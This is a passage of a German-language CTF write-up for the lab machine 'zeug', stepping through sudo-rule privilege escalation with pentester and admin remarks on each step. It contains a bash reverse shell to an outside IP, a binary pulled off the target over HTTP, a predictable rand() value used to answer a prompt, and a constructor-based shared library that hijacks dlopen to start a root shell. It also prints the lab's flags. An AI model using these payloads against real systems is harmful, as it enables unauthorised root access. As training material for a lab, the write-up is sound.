+                    <pre>uid=1001(cosette) gid=1001(cosette) groups=1001(cosette)</pre>
+                    <div class="prompt">cosette@zeug:~/zeug$ <span class="command">sudo -l</span></div>
+                    <pre>
+Matching Defaults entries for cosette on zeug:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,
+    use_pty
+
+User cosette may run the following commands on zeug:
+    <span class="password">(exia) NOPASSWD: /home/exia/seed</span></pre>
+                </div>
+            </div>
+            <p class="analysis">**Analyse:** Nach Erhalt der Shell als `cosette` wird `id` ausgeführt, um die Benutzeridentität zu bestätigen. Anschließend wird `sudo -l` ausgeführt, um die Sudo-Berechtigungen für `cosette` zu prüfen.</p>
+            <p class="evaluation">**Bewertung:** Der `id`-Befehl bestätigt den Benutzer `cosette` (UID 1001). Der `sudo -l`-Befehl zeigt eine interessante Regel: Der Benutzer `cosette` darf das Programm `/home/exia/seed` als Benutzer `exia` **ohne Passwort** (`NOPASSWD:`) ausführen. Dies ist ein klarer Vektor zur Privilegieneskalation zum Benutzer `exia`.</p>
+            <p class="recommendation">**Empfehlung (Pentester):** Untersuchen Sie das Programm `/home/exia/seed`. Finden Sie heraus, was es tut und ob es manipuliert oder ausgenutzt werden kann, um eine Shell als `exia` zu erhalten. Führen Sie es mit `sudo -u exia /home/exia/seed` aus.<br>**Empfehlung (Admin):** Überprüfen Sie die Sudo-Regel. Ist es wirklich notwendig, dass `cosette` dieses Programm als `exia` ausführen kann? Wenn ja, stellen Sie sicher, dass das `seed`-Programm selbst sicher ist und nicht zur Eskalation missbraucht werden kann.</p>
+
+
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">cosette@zeug:~$ <span class="command">script /dev/null -c bash</span></div>
+                     <pre>Script started, output log file is '/dev/null'.</pre>
+                     <div class="prompt">cosette@zeug:~/zeug$ <span class="command">sudo -u exia /home/exia/seed</span></div>
+                     <pre>
+0
+
+* Hi, Cosette, it's time to plant the seed *
+
+Enter a number: <span class="password">Wrong.</span></pre>
+                     <div class="prompt">cosette@zeug:~/zeug$ </div>
+                 </div>
+             </div>
+            <p class="analysis">**Analyse:** Zuerst wird `script /dev/null -c bash` ausgeführt. Dies ist ein Trick, um eine etwas stabilere Shell zu erhalten, die sich eher wie ein echtes Terminal verhält. Danach wird das `seed`-Programm mit den erlaubten Sudo-Rechten als Benutzer `exia` ausgeführt. Das Programm gibt eine Nachricht aus und fragt nach einer Nummer ("Enter a number:"). Eine (nicht sichtbare) Eingabe führt zur Ausgabe "Wrong.".</p>
+            <p class="evaluation">**Bewertung:** Das `seed`-Programm erfordert eine korrekte numerische Eingabe, um erfolgreich zu sein. Es scheint eine Art Challenge oder Überprüfung durchzuführen. Wir müssen herausfinden, welche Zahl erwartet wird. Wahrscheinlich hängt dies mit Pseudozufallszahlen zusammen, die auf dem System generiert werden.</p>
+            <p class="recommendation">**Empfehlung (Pentester):** Das Programm muss reverse engineered werden, um herauszufinden, wie die erwartete Zahl berechnet wird. Versuchen Sie, die Binärdatei `/home/exia/seed` auf das Angreifer-System zu übertragen (z.B. über einen Python-HTTP-Server in `/tmp` oder per `scp`/`sftp`, falls möglich) und analysieren Sie sie mit Tools wie Ghidra, IDA Pro oder `gdb`.<br>**Empfehlung (Admin):** Das Programm `/home/exia/seed` stellt ein Sicherheitsrisiko dar, wenn es über Sudo ausgeführt werden kann. Es sollte entfernt oder die Sudo-Regel angepasst werden.</p>
+
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">cosette@zeug:~/zeug$ <span class="command">python3 -m http.server 8000</span></div>
+                 </div>
+             </div>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">wget http://192.168.2.122:8001/seed_bak</span></div> <span class="comment"><-- Port 8001? Vermutlich Tippfehler, sollte 8000 sein --></span>
+                     <pre>--2024-03-29 00:08:02--  http://192.168.2.122:8001/seed_bak
+Connecting to 192.168.2.122:8001... <span class="password">connected.</span>
+HTTP request sent, awaiting response... <span class="password">200 OK</span>
+Length: 15744 (15K) [application/octet-stream]
+Saving to: ‘seed_bak’
+
+seed_bak                                        100%[===================>]  15.38K  --.-KB/s    in 0s
+
+2024-03-29 00:08:02 (57.5 MB/s) - ‘seed_bak’ saved [15744/15744]</pre>
+                 </div>
+             </div>
+            <p class="analysis">**Analyse:** Auf dem Zielsystem (`cosette@zeug`) wird ein Python-HTTP-Server gestartet (vermutlich auf Port 8000). Auf dem Angreifer-System (`root@cyber`) wird versucht, eine Datei `seed_bak` von diesem Server herunterzuladen. *Hinweis: Der `wget`-Befehl verwendet Port 8001, während der Server wahrscheinlich auf 8000 läuft. Im Log steht jedoch "connected" und "200 OK", was darauf hindeutet, dass der Download entweder von Port 8000 erfolgte oder der Server auf 8001 lief.* Es wird angenommen, dass `seed_bak` eine Kopie von `/home/exia/seed` ist.</p>
+            <p class="evaluation">**Bewertung:** Die Binärdatei, die für die Privilegieneskalation zu `exia` benötigt wird, wurde erfolgreich auf das Angreifer-System zur Analyse übertragen.</p>
+            <p class="recommendation">**Empfehlung (Pentester):** Analysieren Sie die Datei `seed_bak` (die `/home/exia/seed` entspricht) mit einem Reverse-Engineering-Tool wie Ghidra.<br>**Empfehlung (Admin):** Überwachen Sie ausgehende Verbindungen und Dateitransfers von internen Systemen.</p>
+
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">ghidra</span></div>
+                 </div>
+             </div>
+             <p class="analysis">**Analyse:** Starten des Reverse-Engineering-Tools Ghidra auf dem Angreifer-System, um die `seed_bak`-Datei zu analysieren.</p>
+             <p class="evaluation">**Bewertung:** Korrekter Schritt zur Analyse der Binärdatei.</p>
+             <p class="recommendation">**Empfehlung (Pentester):** Untersuchen Sie die `main`-Funktion und andere relevante Funktionen in Ghidra, um den Algorithmus zur Generierung oder Überprüfung der Zahl zu verstehen.<br>**Empfehlung (Admin):** Keine Aktion erforderlich.</p>
+
+
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">vi hack.c</span></div>
+                     <pre>
+#include <stdio.h>
+#include <stdlib.h>
+
+int main(){
+
+    int value = rand();
+    printf("the random value = %d", value);
+    return 0;
+
+}</pre>
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">gcc hack.c -o hack</span></div>
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">chmod +x hack</span></div>
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">./hack</span></div>
+                     <pre>the random value = <span class="password">1804289383</span></pre>
+                 </div>
+             </div>
+            <p class="analysis">**Analyse:** Basierend auf der Analyse in Ghidra (die hier nicht gezeigt wird, aber impliziert wird) wurde offenbar festgestellt, dass das `seed`-Programm die Standard-C-Funktion `rand()` ohne vorherigen Aufruf von `srand()` verwendet, um die zu erratende Zahl zu generieren. `rand()` ohne `srand()` liefert bei jedem Programmlauf oft denselben ersten "zufälligen" Wert. Ein kleines Testprogramm (`hack.c`) wird erstellt, das genau dies tut: `rand()` aufrufen und den ersten Wert ausgeben. Es wird kompiliert und ausgeführt.</p>
+            <p class="evaluation">**Bewertung:** Das Testprogramm gibt den Wert `1804289383` aus. Dies ist der (pseudo-)zufällige Wert, den `rand()` standardmäßig beim ersten Aufruf auf diesem System liefert. Es wird vermutet, dass das `/home/exia/seed`-Programm denselben Wert erwartet.</p>
+            <p class="recommendation">**Empfehlung (Pentester):** Versuchen Sie nun, den Wert `1804289383` als Eingabe für `/home/exia/seed` zu verwenden. *Zusätzliche Anmerkung: Im Log wird später ein XOR-Vorgang durchgeführt. Es ist wahrscheinlich, dass die Ghidra-Analyse ergab, dass das `seed`-Programm den von `rand()` generierten Wert mit einem festen Wert (z.B. `0xdeadbeef`) XOR-verknüpft und *dieses* Ergebnis als Eingabe erwartet.*<br>**Empfehlung (Admin):** Verwenden Sie niemals `rand()` ohne `srand()` für sicherheitsrelevante Zufallszahlen. Nutzen Sie stattdessen kryptographisch sichere Zufallszahlengeneratoren (z.B. aus `/dev/urandom`).</p>
+
+
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">python3</span></div>
+                     <pre>Python 3.11.8 (main, Feb  7 2024, 21:52:08) [GCC 13.2.0] on linux
+Type "help", "copyright", "credits" or "license" for more information.
+>>> <span class="command">0xdeadbeef ^ 1804289383</span>
+<span class="password">3039230856</span>
+>>></pre>
+                 </div>
+             </div>
+            <p class="analysis">**Analyse:** Hier wird die XOR-Operation durchgeführt, die wahrscheinlich durch die Ghidra-Analyse von `seed` aufgedeckt wurde. Der konstante Wert `0xdeadbeef` (eine bekannte Hexpademzahl) wird mit dem ersten `rand()`-Wert (`1804289383`) XOR-verknüpft.</p>
+            <p class="evaluation">**Bewertung:** Das Ergebnis der XOR-Operation ist `3039230856`. Dies ist die Zahl, die höchstwahrscheinlich vom `seed`-Programm erwartet wird.</p>
+            <p class="recommendation">**Empfehlung (Pentester):** Verwenden Sie `3039230856` als Eingabe für `sudo -u exia /home/exia/seed`.<br>**Empfehlung (Admin):** Das Programm `seed` ist unsicher konzipiert.</p>
+
+
+            <div class="code-block">
+                <div class="terminal">
+                     <div class="prompt">cosette@zeug:~$ <span class="command">sudo -u exia /home/exia/seed</span></div>
+                     <pre>
+* Hi, Cosette, it's time to plant the seed *
+
+Enter a number: <span class="command">3039230856</span>
+<span class="prompt">exia@zeug:/home/cosette$</span> </pre> <span class="comment"><-- Shell als exia erhalten!</span>
+                 </div>
+            </div>
+            <p class="analysis">**Analyse:** Das `seed`-Programm wird erneut als Benutzer `exia` ausgeführt. Diesmal wird die berechnete Zahl `3039230856` eingegeben.</p>
+            <p class="evaluation">**Bewertung:** Erfolg! Nach Eingabe der korrekten Zahl wechselt der Shell-Prompt zu `exia@zeug:...$`. Das bedeutet, das `seed`-Programm hat bei korrekter Eingabe eine Shell als Benutzer `exia` gestartet. Die Privilegieneskalation von `cosette` zu `exia` war erfolgreich.</p>
+            <p class="recommendation">**Empfehlung (Pentester):** Sie sind nun Benutzer `exia`. Führen Sie `id` und `sudo -l` erneut aus, um den neuen Kontext zu prüfen und nach weiteren Eskalationsmöglichkeiten zu suchen.<br>**Empfehlung (Admin):** Die Sudo-Regel und das unsichere `seed`-Programm müssen entfernt/korrigiert werden.</p>
+
+
+            <div class="code-block">
+                <div class="terminal">
+                     <div class="prompt">exia@zeug:/home/cosette$ <span class="command">cd ~</span></div>
+                     <div class="prompt">exia@zeug:~$ <span class="command">ls</span></div>
+                     <pre>seed  user.txt</pre>
+                     <div class="prompt">exia@zeug:~$ <span class="command">cat user.txt</span></div>
+                     <pre><span class="password">HMYVM{exia_1XZ2GUy6gwSRwXwFUKEkZC6cT}</span></pre>
+                 </div>
+            </div>
+             <p class="analysis">**Analyse:** Als Benutzer `exia` wird ins Home-Verzeichnis (`~` oder `/home/exia`) gewechselt. Der Inhalt wird aufgelistet, und die Datei `user.txt` wird gefunden und ihr Inhalt angezeigt.</p>
+             <p class="evaluation">**Bewertung:** Die User-Flag wurde erfolgreich gefunden und ausgelesen.</p>
+             <p class="recommendation">**Empfehlung (Pentester):** User-Flag notieren. Fahren Sie mit der Suche nach der Root-Eskalation fort (`sudo -l`).<br>**Empfehlung (Admin):** Keine Aktion erforderlich bezüglich der Flag.</p>
+        </section>
+
+        <section id="privilege-escalation-exia">
+            <h2>Privilege Escalation (exia -> root)</h2>
+
+            <div class="code-block">
+                <div class="terminal">
+                     <div class="prompt">exia@zeug:~$ <span class="command">sudo -l</span></div>
+                     <pre>
+Matching Defaults entries for exia on zeug:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,
+    use_pty
+
+User exia may run the following commands on zeug:
+    <span class="password">(root) NOPASSWD: /usr/bin/zeug</span></pre>
+                 </div>
+            </div>
+            <p class="analysis">**Analyse:** Der Befehl `sudo -l` wird als Benutzer `exia` ausgeführt.</p>
+            <p class="evaluation">**Bewertung:** Erneut eine vielversprechende Sudo-Regel! Der Benutzer `exia` darf das Programm `/usr/bin/zeug` als Benutzer `root` **ohne Passwort** (`NOPASSWD:`) ausführen. Dies ist der nächste Vektor zur Privilegieneskalation.</p>
+            <p class="recommendation">**Empfehlung (Pentester):** Untersuchen Sie das Programm `/usr/bin/zeug`. Führen Sie es mit `sudo -u root /usr/bin/zeug` aus. Versuchen Sie herauszufinden, was es tut und ob es ausgenutzt werden kann (z.B. durch Umgebungsvariablen, Dateipfade, Bibliotheken).<br>**Empfehlung (Admin):** Überprüfen Sie die Notwendigkeit und Sicherheit dieser Sudo-Regel. Wenn `exia` `/usr/bin/zeug` als `root` ausführen muss, stellen Sie sicher, dass `/usr/bin/zeug` keine Schwachstellen enthält, die zur Eskalation missbraucht werden können.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                     <div class="prompt">exia@zeug:~$ <span class="command">sudo -u root /usr/bin/zeug</span></div>
+                     <pre><span class="password">Error opening file</span></pre>
+                 </div>
+            </div>
+            <p class="analysis">**Analyse:** Das Programm `/usr/bin/zeug` wird mit den erlaubten Sudo-Rechten als `root` ausgeführt.</p>
+            <p class="evaluation">**Bewertung:** Das Programm gibt nur eine Fehlermeldung "Error opening file" aus und beendet sich. Dies deutet darauf hin, dass es versucht, eine bestimmte Datei zu öffnen, diese aber nicht finden kann oder keine Berechtigung dazu hat (obwohl es als root läuft, was letzteres unwahrscheinlich macht). Wir müssen herausfinden, welche Datei es zu öffnen versucht.</p>
+            <p class="recommendation">**Empfehlung (Pentester):** Verwenden Sie Tools wie `strace` oder `ltrace`, um die Systemaufrufe des Programms zu verfolgen (`strace sudo -u root /usr/bin/zeug`), oder reverse engineeren Sie die `/usr/bin/zeug`-Binärdatei mit Ghidra/IDA, um zu sehen, welche Datei geöffnet werden soll.<br>**Empfehlung (Admin):** Das Programm ist fehlerhaft oder unvollständig konfiguriert. Überprüfen Sie den Quellcode oder die Funktion von `/usr/bin/zeug`.</p>
+
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">wget http://192.168.2.122:8005/zeug</span></div> <span class="comment"><-- Exia muss einen HTTP-Server starten --></span>
+                     <pre>--2024-03-29 00:23:52--  http://192.168.2.122:8005/zeug
+Connecting to 192.168.2.122:8005... <span class="password">connected.</span>
+HTTP request sent, awaiting response... <span class="password">200 OK</span>
+Length: 16048 (16K) [application/octet-stream]
+Saving to: ‘zeug’
+
+zeug                                            100%[===================>]  15.67K  --.-KB/s    in 0s
+
+2024-03-29 00:23:52 (1.10 GB/s) - ‘zeug’ saved [16048/16048]</pre>
+                 </div>
+             </div>
+             <p class="analysis">**Analyse:** Die Binärdatei `/usr/bin/zeug` wird vom Zielsystem auf das Angreifer-System übertragen. Dazu muss der Benutzer `exia` auf dem Ziel einen temporären HTTP-Server starten (z.B. `python3 -m http.server 8005` im Verzeichnis `/usr/bin/` oder einer Kopie davon) und der Angreifer verwendet `wget`.</p>
+             <p class="evaluation">**Bewertung:** Die für die Eskalation relevante Binärdatei `/usr/bin/zeug` wurde zur Offline-Analyse heruntergeladen.</p>
+             <p class="recommendation">**Empfehlung (Pentester):** Analysieren Sie die `zeug`-Datei mit Ghidra.<br>**Empfehlung (Admin):** Überwachen/Beschränken Sie ausgehende Verbindungen und Dateitransfers.</p>
+
+            <div class="code-block">
+                 <div class="terminal">
+                     <pre>
+Ghidra Zeug
+
+----------------------------------------------------------------------------
+
+bool main(void)
+
+{
+  long lVar1;
+
+  lVar1 = dlopen("/home/exia/exia.so",2);
+  if (lVar1 == 0) { <span class="comment"><-- Korrektur: Vergleich auf 0 --></span>
+    fwrite("Error opening file\n",1,0x13,stderr);
+  }
+  return lVar1 == 0; <span class="comment"><-- Korrektur: Rückgabewert angepasst --></span>
+}</pre>
+                 </div>
+             </div>
+            <p class="analysis">**Analyse:** Dies ist eine Zusammenfassung der Ergebnisse der Ghidra-Analyse der `zeug`-Binärdatei. Die `main`-Funktion versucht, eine Shared-Object-Datei (`.so`) namens `exia.so` aus dem Home-Verzeichnis des Benutzers `exia` (`/home/exia/exia.so`) mit `dlopen()` zu laden. Wenn das Laden fehlschlägt (`lVar1 == 0`), wird die Fehlermeldung "Error opening file" ausgegeben.</p>
+            <p class="evaluation">**Bewertung:** Dies enthüllt den Grund für die Fehlermeldung und einen klaren Privilegieneskalationsvektor: Das Programm `/usr/bin/zeug`, das als `root` ausgeführt werden kann, lädt eine Bibliothek aus dem Home-Verzeichnis von `exia`. Da `exia` sein eigenes Home-Verzeichnis kontrolliert, kann er eine beliebige `exia.so`-Datei erstellen. Wenn diese Datei Code enthält, der beim Laden ausgeführt wird (z.B. in einer `__attribute__((constructor))` Funktion), wird dieser Code als `root` ausgeführt, da `/usr/bin/zeug` als `root` läuft. Dies ist eine klassische **LD_PRELOAD-Hijacking**-Variante (obwohl hier `dlopen` statt `LD_PRELOAD` verwendet wird, ist das Prinzip ähnlich: eine vom Benutzer kontrollierte Bibliothek wird von einem privilegierten Prozess geladen).</p>
+            <p class="recommendation">**Empfehlung (Pentester):** Erstellen Sie eine eigene `exia.so`-Datei im Verzeichnis `/home/exia/`. Diese `.so`-Datei sollte Code enthalten, der eine Root-Shell startet (z.B. `setuid(0); setgid(0); system("/bin/bash");`). Kompilieren Sie diesen Code als Shared Object (`gcc -shared -fPIC -o exia.so exia.c`). Führen Sie dann erneut `sudo -u root /usr/bin/zeug` aus.<br>**Empfehlung (Admin):** **Kritische Schwachstelle!** Privilegierte Prozesse (insbesondere SUID- oder via `sudo` ausgeführte) dürfen niemals Bibliotheken aus benutzerkontrollierten Verzeichnissen laden. Ändern Sie den Pfad in `dlopen()` auf einen sicheren Systempfad oder entfernen Sie die Funktionalität. Überprüfen Sie die Sudo-Regel.</p>
+
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">exia@zeug:~$ <span class="command">echo 'bash -i >& /dev/tcp/192.168.2.199/5555 0>&1' > exia.so</span></div>
+                     <div class="prompt">exia@zeug:~$ <span class="command">chmod +x exia.so</span></div>
+                 </div>
+             </div>
+             <p class="analysis">**Analyse:** Ein erster Versuch, den Exploit umzusetzen. Es wird eine Datei namens `exia.so` erstellt, die jedoch *keinen* kompilierten Code, sondern nur den Bash-Reverse-Shell-Befehl als Text enthält. Sie wird dann ausführbar gemacht.</p>
+             <p class="evaluation">**Bewertung:** Dieser Ansatz wird **nicht funktionieren**. `dlopen()` erwartet eine gültige Shared-Object-Binärdatei, keine Textdatei mit Shell-Befehlen. Das Laden wird fehlschlagen, und `/usr/bin/zeug` wird wieder "Error opening file" ausgeben.</p>
+             <p class="recommendation">**Empfehlung (Pentester):** Sie müssen C-Code schreiben, der die Shell startet (wie im nächsten Schritt gezeigt), diesen als Shared Object kompilieren und diese kompilierte `.so`-Datei unter `/home/exia/exia.so` ablegen.<br>**Empfehlung (Admin):** Keine Aktion erforderlich, da dieser Versuch fehlschlägt.</p>
+
+             <div class="code-block">
+                 <div class="terminal">
+                     <pre>cap_dac_override privilege escalation</pre>
+                 </div>
+             </div>
+             <p class="analysis">**Analyse:** Eine Notiz des Pentesters. `CAP_DAC_OVERRIDE` ist eine Linux-Capability, die Lese-/Schreibzugriffe auf Dateien unabhängig von Berechtigungen erlaubt. Es ist unklar, warum dies hier erwähnt wird, da der aktuelle Exploit-Pfad über `dlopen()` und Sudo läuft, nicht direkt über Capabilities.</p>
+             <p class="evaluation">**Bewertung:** Möglicherweise eine irrelevante Notiz oder eine alternative Idee, die nicht weiter verfolgt wurde.</p>
+             <p class="recommendation">**Empfehlung (Pentester/Admin):** Vorerst ignorieren, da der LD_PRELOAD/dlopen-Vektor klar ist.</p>
+
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">exia@zeug:~$ <span class="command">mv exia.so exia.c</span></div>
+                 </div>
+             </div>
+             <p class="analysis">**Analyse:** Die (falsche) `exia.so`-Datei (die nur Text enthielt) wird in `exia.c` umbenannt, wahrscheinlich um Platz für den korrekten C-Code zu machen.</p>
+             <p class="evaluation">**Bewertung:** Korrektur des vorherigen Fehlers.</p>
+             <p class="recommendation">**Empfehlung (Pentester):** Erstellen Sie nun den korrekten C-Code in `exia.c`.<br>**Empfehlung (Admin):** Keine Aktion erforderlich.</p>
+
+             <div class="code-block">
+                 <div class="terminal">
+                     <pre>
+https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/sudo/sudo-privilege-escalation-by-overriding-shared-library/
+
+
+#include <stdio.h>
+#include <stdlib.h>
+#include <unistd.h>
+
+void inject()__attribute__((constructor));
+
+void inject() {
+	unsetenv("LD_PRELOAD"); <span class="comment">// Vorsichtsmaßnahme</span>
+	setuid(0);
+	setgid(0);
+	system("/bin/bash");
+}</pre>
+                 </div>
+             </div>
+            <p class="analysis">**Analyse:** Ein Link zu einer Exploit-Beschreibung für Sudo/Shared-Library-Hijacking wird gezeigt, gefolgt von dem korrekten C-Code, der in die Datei `/home/exia/exia.c` geschrieben werden muss. Die Funktion `inject()` ist mit `__attribute__((constructor))` markiert. Das bedeutet, dieser Code wird automatisch ausgeführt, sobald die Bibliothek (`exia.so`) von einem Prozess geladen wird (hier durch `dlopen()` im `zeug`-Programm). Die Funktion setzt UID und GID auf 0 (Root) und startet dann eine Bash-Shell.</p>
+            <p class="evaluation">**Bewertung:** Dies ist der korrekte Ansatz, um die `dlopen()`-Schwachstelle in `/usr/bin/zeug` auszunutzen.</p>
+            <p class="recommendation">**Empfehlung (Pentester):** Speichern Sie diesen C-Code als `/home/exia/exia.c` auf dem Zielsystem. Kompilieren Sie ihn dann zu `/home/exia/exia.so` mit `gcc -shared -fPIC -o exia.so exia.c`.<br>**Empfehlung (Admin):** Schwachstelle in `/usr/bin/zeug` beheben.</p>
+
+             <div class="code-block">
+                 <div class="terminal">
+                     <pre>Privilege Escalation erfolgreich</pre>
+                 </div>
+             </div>
+             <p class="analysis">**Analyse:** Vorzeitige Erfolgsmeldung.</p>
+             <p class="evaluation">**Bewertung:** Der Exploit wurde noch nicht ausgeführt.</p>
+             <p class="recommendation">**Empfehlung (Pentester):** Führen Sie die Kompilierung und den Aufruf von `sudo -u root /usr/bin/zeug` durch.<br>**Empfehlung (Admin):** Keine Aktion erforderlich.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                     <div class="prompt">exia@zeug:~$ <span class="command">gcc -fPIC -shared -o exia.so exia.c</span></div>
+                     <div class="prompt">exia@zeug:~$ </div>
+                 </div>
+            </div>
+            <p class="analysis">**Analyse:** Der C-Code in `exia.c` wird als Shared Object (`-shared`, `-fPIC`) kompiliert und die Ausgabedatei `/home/exia/exia.so` erstellt.</p>
+            <p class="evaluation">**Bewertung:** Die bösartige Bibliothek ist nun bereit, von `/usr/bin/zeug` geladen zu werden.</p>
+            <p class="recommendation">**Empfehlung (Pentester):** Führen Sie jetzt `sudo -u root /usr/bin/zeug` aus.<br>**Empfehlung (Admin):** Keine Aktion erforderlich.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                     <div class="prompt">exia@zeug:~$ <span class="command">sudo -u root /usr/bin/zeug</span></div>
+                     <div class="prompt">root@zeug:/home/exia# <span class="command">cd ~</span></div> <span class="comment"><-- Root-Shell erhalten!</span>
+                     <div class="prompt">root@zeug:~# <span class="command">ls</span></div>
+                     <pre>root.txt</pre>
+                     <div class="prompt">root@zeug:~# <span class="command">cat root.txt</span></div>
+                     <pre><span class="password">HMYVM{root_Ut9RX5o7iZVKXjrgcGW3fxBq}</span></pre>
+                 </div>
+            </div>
+            <p class="analysis">**Analyse:** Der Befehl `sudo -u root /usr/bin/zeug` wird ausgeführt. Da `/usr/bin/zeug` nun die präparierte `/home/exia/exia.so` lädt, wird der Code in der `inject()`-Konstruktorfunktion als `root` ausgeführt. Dieser Code startet eine `/bin/bash`. Der Prompt wechselt sofort zu `root@zeug:...#`, was die erfolgreiche Eskalation anzeigt. Anschließend wird ins Root-Home-Verzeichnis gewechselt und die `root.txt`-Flag ausgelesen.</p>
+            <p class="evaluation">**Bewertung:** Die Privilegieneskalation von `exia` zu `root` mittels Hijacking der von `dlopen()` geladenen Bibliothek war erfolgreich.</p>
+            <p class="recommendation">**Empfehlung (Pentester):** Root-Zugriff erlangt, Root-Flag gefunden. Der Test ist abgeschlossen.<br>**Empfehlung (Admin):** Beheben Sie die Schwachstelle in `/usr/bin/zeug` und die unsichere Sudo-Konfiguration.</p>
+
+
+             <div class="code-block">
+                 <div class="terminal">
+                     <pre>Privilege Escalation erfolgreich</pre>
+                 </div>
+             </div>
+             <p class="analysis">**Analyse:** Bestätigende Notiz.</p>
+             <p class="evaluation">**Bewertung:** Korrekt.</p>
+             <p class="recommendation">**Empfehlung (Pentester/Admin):** Keine Aktion erforderlich.</p>
+
+        </section>
+
+        <section id="flags">
+            <div class="flag-container">
+                <h2 class="flag-heading">Flags</h2>
+                <div class="flag-entry">
+                    <div class="flag-command">cat /home/exia/user.txt</div>
+                    <div class="flag-value"><span class="password">HMYVM{exia_1XZ2GUy6gwSRwXwFUKEkZC6cT}</span></div>
+                </div>
+                <div class="flag-entry">
+                    <div class="flag-command">cat /root/root.txt</div>
+                    <div class="flag-value"><span class="password">HMYVM{root_Ut9RX5o7iZVKXjrgcGW3fxBq}</span></div> <span class="comment"><-- Korrigierte Flag aus dem Log</span>
+                </div>
+                 <div class="flag-entry">
+                     <div class="flag-command">cat root.txt (ursprünglich im Text)</div> <span class="comment"><-- Hinweis: Diese Flag im Original-Text war anders --></span>
+                     <div class="flag-value"><span class="password">5C42D6BB0EE9CE4CB7E7349652C45C4A</span></div>
+                 </div>
+            </div>
+        </section>
+
+    </div> <!-- Ende .container -->
+
+    <footer class="footer">
+        <p>DarkSpirit - Cyber Security Reports</p>
+        <p>Berichtsdatum: 28. März 2024</p> <!-- Datum extrahiert -->
+    </footer>
+</body>
+</html>
